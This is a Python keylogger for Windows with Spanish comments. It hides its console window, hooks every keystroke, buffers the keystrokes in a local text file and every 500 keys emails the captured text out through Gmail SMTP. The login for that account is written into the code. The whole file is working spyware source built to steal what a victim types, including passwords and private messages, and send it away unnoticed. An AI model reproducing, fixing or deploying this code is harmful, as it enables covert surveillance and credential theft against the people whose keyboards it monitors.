import win32console
import win32gui
import pythoncom,pyHook
import time
import smtplib
import os
import sys
import threading

################################################
# CREACION DE VARIABLES
# ############################################## 
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
 
#crea el archivo .txt 
f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","w+")
f.close
 
#Variable que cuenta las tecas presionadas
count = 0
 
########################################################
# FUNCIONES
########################################################
 
def send_email(message):
    """
    entradas: recibe un str como cuerpo del correo, como variable global
    el objeto hm (hook manager)
    descripcion: envia un mensaje al correo indicado
    """
    global hm
    print("mensaje")
    try:
         
        # Datos
        fromaddr = 'containeroflogs@gmail.com'
        toaddrs = 'containeroflogs@gmail.com'
        username = 'containeroflogs@gmail.com'
        password = 'juancamilo99'
 
        # Enviando el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs, message)
        server.quit()
 
    except:
 
        pass
    #vuelve a llamar el objeto hook manager
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
 
 
def OnKeyboardEvent(event):
    """
    entradas: como entrada global la variable count
    descripcion: captura las teclas oprimidas, al escribirse cierta cantidad 
    de caracteres se evnia un correo con lo escrito
    """
    global count
    count += 1
    #presiona CTRL+E para salir
    if event.Ascii==5:
        sys.exit(0)
 
    if event.Ascii !=0 or 8:
        #abre el archivo 
        f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","r+")
        buffer=f.read()       
        f.close() 
        if  count == 500: 
            #Envia los ultimos 500 caracteres
            capturado = buffer[-500:]
            f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","w")
            f.truncate()
            f.close() 
            send_email(capturado)
            count = 0
           
        #abre el archivo escribe y suma nuevas pulsaciones
        f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","w")
        keylogs=chr(event.Ascii)
 
        #si se presiona ENTER
        if event.Ascii==13:
            keylogs='\n'
 
        #si se preciona ESPACIO 
        if event.Ascii==32:
            keylogs=' '
 
        buffer+=keylogs
        f.write(buffer)
        f.close()
 
         
# crea el objeto hook manager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
